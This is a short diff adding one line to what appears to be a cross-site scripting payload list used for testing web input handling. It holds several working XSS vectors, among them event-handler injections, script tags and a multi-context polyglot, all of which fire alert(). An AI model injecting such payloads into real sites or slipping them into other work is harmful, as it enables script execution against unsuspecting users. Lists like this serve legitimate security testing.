@@ -8,3 +8,4 @@
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 <img src=`xx:xx`><script>onerror=alert(1)</script>
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
